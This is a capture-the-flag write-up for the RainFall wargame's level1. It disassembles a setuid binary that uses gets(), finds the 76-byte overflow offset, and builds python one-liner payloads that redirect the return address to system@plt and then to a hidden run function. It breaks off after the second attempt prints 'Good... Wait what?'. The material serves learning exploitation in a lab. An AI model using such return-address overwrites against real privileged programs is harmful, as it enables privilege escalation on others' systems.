```
level1@RainFall:~$ ls -la level1
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$ ./level1
Yes what is hapenning?
level1@RainFall:~$
level1@RainFall:~$ gdb level1 -quiet
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

The programm calls the function `gets`.

`char *gets(char *s)` </br>
`gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (aq\0aq)` </br>
`Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security.
`</br>
https://linux.die.net/man/3/gets </br>
https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used

Let's do some documentation on buffer overflows and find how to perform a `buffer overflow attack`.

```bash
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Illegal instruction (core dumped)
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```
Past 76 characters the program crashes, the buffer size should be around this value.

```
level1@RainFall:~$ gdb level1 -quiet
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level1/level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbccccccccc

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) info frame
Stack level 0, frame at 0xbffff704:
 eip = 0x61616161; saved eip 0x62626262
 called by frame at 0xbffff708
 Arglist at 0xbffff6fc, args:
 Locals at 0xbffff6fc, Previous frame's sp is 0xbffff704
 Saved registers:
  eip at 0xbffff700
(gdb) x/100x 0xbffff700
0xbffff700:	0x62626262	0x62626262	0x63636362	0x63636363
0xbffff710:	0x00006363	0xbffff71c	0xbffff79c	0x00000000
0xbffff720:	0x08048230	0xb7fd0ff4	0x00000000	0x00000000
0xbffff730:	0x00000000	0xdeb1b052	0xe9f69442	0x00000000
0xbffff740:	0x00000000	0x00000000	0x00000001	0x08048390
0xbffff750:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
0xbffff760:	0x00000001	0x08048390	0x00000000	0x080483b1
0xbffff770:	0x08048480	0x00000001	0xbffff794	0x080484a0
0xbffff780:	0x08048510	0xb7fed280	0xbffff78c	0xb7fff918
0xbffff790:	0x00000001	0xbffff8b8	0x00000000	0xbffff8d1
0xbffff7a0:	0xbffff8e5	0xbffff8f5	0xbffff917	0xbffff92a
0xbffff7b0:	0xbffff936	0xbffffe57	0xbffffe63	0xbffffe79
0xbffff7c0:	0xbffffec6	0xbffffed5	0xbffffeeb	0xbffffefc
0xbffff7d0:	0xbfffff05	0xbfffff0d	0xbfffff24	0xbfffff3e
0xbffff7e0:	0xbfffff4d	0xbfffff5c	0xbfffff8e	0xbfffffae
0xbffff7f0:	0xbfffffc1	0x00000000	0x00000020	0xb7fdd418
0xbffff800:	0x00000021	0xb7fdd000	0x00000010	0x178bfbff
0xbffff810:	0x00000006	0x00001000	0x00000011	0x00000064
0xbffff820:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffff830:	0x00000005	0x00000008	0x00000007	0xb7fde000
0xbffff840:	0x00000008	0x00000000	0x00000009	0x08048390
0xbffff850:	0x0000000b	0x000007ee	0x0000000c	0x000007ee
0xbffff860:	0x0000000d	0x000007ee	0x0000000e	0x000007ee
0xbffff870:	0x00000017	0x00000000	0x00000019	0xbffff89b
0xbffff880:	0x0000001f	0xbfffffe3	0x0000000f	0xbffff8ab
```



`Let's see what happens when we execute the buf-program with a name-parameter of 108 characters long. The 108 characters will be built up by 100 times the letter 'A', 4 times a 'B', followed by 4 times the letter 'C'. Later, when inspecting the program's memory, this distinction of the letters will make it easier to identify the memory segments that were overwritten. We're expecting the first 100 A's to fill the buffer, the B's to overwrite the EBP and the C's to overwrite the return address.

In order to produce the string, I'll use the following python script: python -c 'print "\x41" * 100, which will generate a string with 100 times the character 'A' (0x41 is hexadecimal for 65, which is the ASCII-code for the letter 'A'). To those 100 characters, the four B's (0x42) and the four C's (0x43) will be added, producing a string with a total length of 108 bytes.`

When called with -c command , it executes the Python statement(s) given as command.
```
level1@RainFall:~$ python -c 'print "\x41" * 80' | ./level1
Segmentation fault (core dumped)
level1@RainFall:~$ python -c 'print "\x41" * 76' | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$ python -c 'print "\x41" * 75' | ./level1
level1@RainFall:~$
```
`BAM! Segmentation fault. This is an error the CPU produces when you something tries to access a part of the memory it should not be accessing. It didn't happen because a piece of memory was overwritten, it happened because the return address was overwritten with C's (0x43434343). There's nothing at address 0x43434343 and if there is, it does not belong to the program so it is not allowed to read it. This produces the segmentation fault.`
https://www.coengoedegebure.com/buffer-overflow-attacks-explained/

```
(gdb) r
Starting program: /home/user/level1/level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/100x $sp-200
0xbffff638:	0x00000000	0xb7fdcb48	0x00000001	0xb7fd0ff4
0xbffff648:	0xb7fd0ff4	0xb7e91f09	0xb7fd1ac0	0xbffff6b1
0xbffff658:	0x7fffffff	0x0000000a	0x00000000	0xb7e30418
0xbffff668:	0x00000001	0xb7ec3c49	0xbffff6af	0xb7fd0ff4
0xbffff678:	0x00000000	0xfbad2288	0xbffff6f8	0xb7ff26b0
0xbffff688:	0xbffff724	0xb7fd0ff4	0x00000000	0x00000000
0xbffff698:	0xbffff6f8	0x08048495	0xbffff6b0	0x0000002f
0xbffff6a8:	0xbffff6fc	0xb7fd0ff4	0x61616161	0x61616161
0xbffff6b8:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6c8:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6d8:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6e8:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6f8:	0x61616161	0x62626262	0x63636363	0xbffff700
0xbffff708:	0xbffff79c	0xb7fdc858	0x00000000	0xbffff71c
0xbffff718:	0xbffff79c	0x00000000	0x08048230	0xb7fd0ff4
0xbffff728:	0x00000000	0x00000000	0x00000000	0x086558a6
0xbffff738:	0x3f227cb6	0x00000000	0x00000000	0x00000000
0xbffff748:	0x00000001	0x08048390	0x00000000	0xb7ff26b0
0xbffff758:	0xb7e453e9	0xb7ffeff4	0x00000001	0x08048390
0xbffff768:	0x00000000	0x080483b1	0x08048480	0x00000001
0xbffff778:	0xbffff794	0x080484a0	0x08048510	0xb7fed280
0xbffff788:	0xbffff78c	0xb7fff918	0x00000001	0xbffff8b8
0xbffff798:	0x00000000	0xbffff8d1	0xbffff8e5	0xbffff8f5
0xbffff7a8:	0xbffff917	0xbffff92a	0xbffff936	0xbffffe57
0xbffff7b8:	0xbffffe63	0xbffffe79	0xbffffec6	0xbffffed5
(gdb) i r
eax            0xbffff6b0	-1073744208
ecx            0xb7fd28c4	-1208145724
edx            0xbffff6b0	-1073744208
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff700	0xbffff700
ebp            0x61616161	0x61616161
esi            0x0	0
edi            0x0	0
eip            0x62626262	0x62626262
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

EBP and return address are overwritten !

The EBP-register contains the B's: 0x42424242 and the EIP-register contains the C's: 0x43434343. The EIP (Extended Instruction Pointer) contains the address of the next instruction to be executed, which now points to the faulty address.

Now 0x43434343 is a faulty address. However, if this address would point to malicious code, we could have a problem. Well... the problem would exist from the programmer's point of view, because from a hacker's perspective, this is exactly what we want to achieve.

To which code to point here?

```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) disas system
Dump of assembler code for function system@plt:
   0x08048360 <+0>:	jmp    *0x80497a0
   0x08048366 <+6>:	push   $0x10
   0x0804836b <+11>:	jmp    0x8048330
End of assembler dump.
```

Let's try with `system`.

```
level1@RainFall:~$ python -c 'print "a"*76 + "\x60\x83\x04\x08"' | ./level1
sh: 1: ����: not found
Segmentation fault (core dumped)
level1@RainFall:~$
```

```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```

We can see that `run` calls system.

Let's try with `run`.

```
level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
```

Wait, what?

`0x0804846d <+41>:	call   0x8048350 <fwrite@plt>`

